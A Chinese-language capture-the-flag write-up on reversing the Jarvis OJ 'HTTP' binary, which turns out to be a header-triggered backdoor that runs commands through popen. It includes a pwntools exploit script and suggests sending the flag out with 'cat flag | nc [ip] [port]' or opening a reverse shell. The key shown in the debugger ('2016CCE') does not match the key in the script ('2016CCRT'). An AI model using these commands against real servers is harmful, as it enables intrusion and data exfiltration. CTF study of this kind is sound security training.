---
title: Jarvis OJ - HTTP の Write-Up
date: 2020-09-03 18:45:08
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- Stack
---
## Step 1

运行程序和Guess一样也没有回显，猜测也是一个开放端口的操作，checksec一下：

![](/img/HTTP/HTTP1.png)

<!-- more -->

## Step 2

直接进入逆向代码阶段，IDA打开程序，首先是main函数。果然又是一个socket服务器端模型，监听端口为0x70F即1807:

![](/img/HTTP/HTTP2.png)

根据伪代码，这个sub_40137C函数就是处理函数了，看下这个函数：

![](/img/HTTP/HTTP3.png)

又牵扯到一堆函数，一个一个看下，首先是sub_40125D函数：

![](/img/HTTP/HTTP4.png)

结合ASC II码，函数中间最长的if判断应该改写为：

```Python
if ( v6 <= 3
    	|| s[v6 - 1] != '\n'
    	|| s[v6 - 2] != '\r'
    	|| s[v6 - 3] != '\n'
    	|| s[v6 - 4] != '\r' )
	continue;
```

通过这个结构我们发现这是将HTTP请求包的Header和Body部分分开进行处理。这里主要是针对Header部分的处理是通过sub_40116C函数：

![](/img/HTTP/HTTP5.png)

“User-Agent:  ”的数据放在v4中由sub_400FAF函数先做个判断，此外Header中需要有个“back: ”的参数，且该参数将由sub_40102F函数处理。先看下这个函数和这个奇怪的“back: ”参数：

![](/img/HTTP/HTTP6.png)

这个函数看起来存在问题，提及到了可以执行shell命令的popen函数，错误回复信息中也提到了“command”的字眼，猜测是个可以导致命令执行的重点函数。

回头去看下处理“User-Agent:  ”字段的sub_400FAF函数：

![](/img/HTTP/HTTP7.png)

首先是通过sub_400D30函数得到s，然后将s与“User-Agent:  ”提交的数据循环做异或，看下sub_400D30函数：

![](/img/HTTP/HTTP8.png)

sub_400CEA函数：

![](/img/HTTP/HTTP9.png)

sub_400C86函数：

![](/img/HTTP/HTTP10.png)

大体上来说这个函数对数据进行一系列操作，但是并不需要了解细节。因为在sub_400FAF函数中发现sub_400D30函数操作的off_601CF0位置的数据，和我们的输入没有任何关系。所以理论上说sub_400D30函数的结果对于我们来说就是个固定的数值，只需要控制程序执行这个函数，然后直接读取最终数值就可以。

最后再看下sub_40116C函数中最后提到的sub_4010DF函数：

![](/img/HTTP/HTTP11.png)

这就是个普通的提示函数，没什么重要信息。

## Step 3

经过伪代码的分析，发现这个大致类似一个Webshell的方式。我们需要在HTTP的Header中提供User-agent 字段以及 back 字段。其中User-agent 字段的数据类似Webshell的password，与程序中的数据做对比。而back 字段是要执行的命令，程序收到包做了验证之后就会执行提交的命令，然后将命令执行结果在响应包的Body中返回。

根据上一步的分析，我们需要调试程序找到我们需要的User-agent 字段的数据，通过hopper发现直接在0x400fca位置下个断点就可以：

![](/img/HTTP/HTTP12.png)

根据sub_400d30函数，执行完之后结果会放到RAX寄存器中去：

![](/img/HTTP/HTTP13.png)

gdb attach上去下断点（下在主进程上）：

![](/img/HTTP/HTTP14.png)

然后nc上去会fork一个子进程，输入按要求的payload，触发sub_400D30函数：

![](/img/HTTP/HTTP15.png)

主进程断在我们想要的地方，发现了函数输出完之后，RAX寄存器中的数据：2016CCE

![](/img/HTTP/HTTP16.png)

下面就是EXP脚本的编写了：

```Python
from pwn import *

sh = remote('127.0.0.1', 1807)

key = '2016CCRT'

password = ''
num = 0
for x in key:
	password += chr(ord(x) ^ num)
	num += 1
print "password: " + password

command = 'cat flag'

payload = ""
payload += "GET / HTTP/1.1\r\n"
payload += "User-Agent: %s\r\n" % (password)
payload += "back: %s\r\n" % (command)
payload += "\r\n"
payload += "\r\n"
print "payload: " + payload

sh.sendline(payload)
sh.recv()
sh.close()
```

本地运行通过：

![](/img/HTTP/HTTP17.png)

![](/img/HTTP/HTTP18.png)

## Step 4

但是远程执行时，首先不知道flag文件格式。其次根据本地调试结果来看，回显的内容是在服务端，无法到达客户端，客户端只能通过Content-Length 字段得知了命令执行输出结果的长度。所以有以下几种方法：

* 通过一台公网服务器监听某个端口, 然后让目标服务器去执行`cat flag | nc [ip] [port]`命令将`cat flag`的输出结果发送给公网服务器的指定端口

* 使用`awk`等字符串处理命令来逐个字符读取flag，然后对这个字符进行判断是不是等于某一个字符，根据判断的结果产生不同的输出我们就可以根据这个输出的不同来判断这个我们猜测的字符是不是正确

* 最暴力的方法，直接反弹shell
